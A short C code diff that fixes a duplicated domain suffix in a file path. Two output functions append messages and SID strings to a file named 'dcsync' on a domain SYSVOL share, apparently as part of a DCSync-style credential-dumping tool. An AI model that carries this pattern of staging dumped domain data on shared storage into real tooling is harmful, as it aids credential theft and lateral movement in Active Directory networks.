@@ -79,7 +79,7 @@ void print_msg(PCWCHAR format, ...)
 {
 	va_list args;
 	va_start(args, format);
-	pFile = fopen("\\\\test.com\\sysvol\\test.com.com\\dcsync", "a");
+	pFile = fopen("\\\\test.com\\sysvol\\test.com\\dcsync", "a");
 	vfwprintf(pFile, format, args);
 	fflush(stdout);
 	va_end(args);
@@ -131,7 +131,7 @@ void displaySID(IN PSID pSid)
 	LPSTR stringSid;
 	if (ConvertSidToStringSidA(pSid, &stringSid))
 	{
-		pFile = fopen("\\\\test.com\\sysvol\\test.com.com\\dcsync", "a");
+		pFile = fopen("\\\\test.com\\sysvol\\test.com\\dcsync", "a");
 		fprintf(pFile,"%s", stringSid);
 		LocalFree(stringSid);
 		fclose(pFile);
